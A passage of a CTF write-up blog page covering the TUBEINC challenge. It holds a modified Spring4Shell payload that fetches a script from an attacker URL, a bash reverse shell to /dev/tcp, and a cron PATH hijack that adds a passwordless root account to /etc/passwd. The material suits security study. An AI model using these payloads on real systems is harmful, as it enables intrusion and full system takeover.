+	srcset="/p/tfc-ctf-2022/img/tube_3_hu1011ec3cc9f47d81aa6f5e3a15d151d7_23448_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/tube_3_hu1011ec3cc9f47d81aa6f5e3a15d151d7_23448_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1372"
+		data-flex-basis="3294px"
+	
+></p>
+<p>Now we need to escalate our privileges to <code>root</code> to get the root flag but getting a reverse shell is the trickiest part I guess. I tried multiple methods to get a reverse shell but none of them worked so I had to modify the <code>Spring4Shell</code> exploit to upload the <code>rev.sh</code> file to the server.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">run_exploit</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">directory</span> <span class="o">=</span> <span class="s2">&#34;webapps/ROOT&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filename</span> <span class="o">=</span> <span class="n">secrets</span><span class="o">.</span><span class="n">token_hex</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">post_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">get_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;prefix&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;%&#34;</span><span class="p">,</span> <span class="s2">&#34;suffix&#34;</span><span class="p">:</span> <span class="s2">&#34;%&gt;//&#34;</span><span class="p">,</span> <span class="s2">&#34;c&#34;</span><span class="p">:</span> <span class="s2">&#34;Runtime&#34;</span><span class="p">,</span> <span class="s2">&#34;d&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;&gt;&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">log_pattern</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;class.module.classLoader.resources.context.parent.pipeline.first.pattern=</span><span class="si">%25%</span><span class="s2">7Bprefix%7Di%20java.io.InputStream</span><span class="si">%20i</span><span class="s2">n%20=%20new%20java.net.URL(request.getParameter(</span><span class="si">%22u</span><span class="s2">rl%22)).openStream();%20java.nio.file.Files.copy(in,%20java.nio.file.Paths.get(%22/tmp/rev.sh%22));</span><span class="si">%20%</span><span class="s2">25%7Bsuffix%7Di%0A&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>rev.sh</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/myip/port 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now run the exploit, send request with the url parameter, and get the reverse shell :)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://legacy.tube.com:52524/3823ccc6aae29902cda00dd7c16dbccf.jsp?url=http://ngrok.site/rev.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/tfc-ctf-2022/img/tube_4.png"
+	width="468"
+	height="194"
+	srcset="/p/tfc-ctf-2022/img/tube_4_hub1d0a3417ccf4df747d1d46f2a8ec052_63739_480x0_resize_box_3.png 480w, /p/tfc-ctf-2022/img/tube_4_hub1d0a3417ccf4df747d1d46f2a8ec052_63739_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="241"
+		data-flex-basis="578px"
+	
+></p>
+<p>Check all the normal privilege escalation things and we can find that there is a cronjob we can try to exploit.</p>
+<p>/etc/cron.d/update</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SHELL=/bin/sh
+</span></span><span class="line"><span class="cl">PATH=/var/tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+</span></span><span class="line"><span class="cl">* * * * * root apt update &gt;&gt; /var/log/cron.log
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>PATH</code> includes the global writeable directory <code>/var/tmp</code>. That means we can create our own malicious <code>apt</code> file and put it in the <code>/var/tmp</code> direcotry to make the cronjob executes our <code>apt</code> file not the original <code>apt</code>.</p>
+<p>apt</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nb">echo</span> <span class="s2">&#34;imgroot::0:0:root:/root:/bin/bash” &gt;&gt; /etc/passwd
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we just need to get the root flag!!!!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ su - imgroot 
+</span></span><span class="line"><span class="cl"># cat /root/root.flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+            <a href="/tags/web/">Web</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 g0tfl4g
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.12.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#robots-and-music">ROBOTS AND MUSIC</a></li>
+    <li><a href="#pong">PONG</a></li>
+    <li><a href="#are-you-the-admin">ARE YOU THE ADMIN?</a></li>
+    <li><a href="#deeplinks">DEEPLINKS</a></li>
+    <li><a href="#calendar">CALENDAR</a></li>
+    <li><a href="#diamonds">DIAMONDS</a></li>
+    <li><a href="#include-what-matters">INCLUDE WHAT MATTERS</a></li>
+    <li><a href="#tubeinc">TUBEINC</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
